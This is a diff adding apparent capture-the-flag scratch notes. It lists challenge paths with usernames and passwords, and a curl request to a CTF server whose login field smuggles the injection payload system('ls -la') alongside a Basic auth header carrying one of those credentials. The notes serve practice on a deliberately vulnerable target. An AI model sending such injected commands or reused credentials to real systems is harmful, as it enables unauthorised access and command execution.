@@ -1,0 +1,17 @@
+m4st3rCTF/chall2 \n user \n CTF2020#@!
+/chall3 user CTF2020_chall3!@# 
+img user CTF_2020_ch4ll4 
+
+curl "http://52.174.177.134/chall4/" ^
+  -H "Connection: keep-alive" ^
+  -H "Cache-Control: max-age=0" ^
+  -H "Authorization: Basic dXNlcjpDVEZfMjAyMF9jaDRsbDQ=" ^
+  -H "Upgrade-Insecure-Requests: 1" ^
+  -H "Origin: http://52.174.177.134" ^
+  -H "Content-Type: application/x-www-form-urlencoded" ^
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" ^
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ^
+  -H "Referer: http://52.174.177.134/chall4/" ^
+  -H "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" ^
+  --data-raw "Statu=Guest^&login=system('ls -la')" ^
+  --insecure
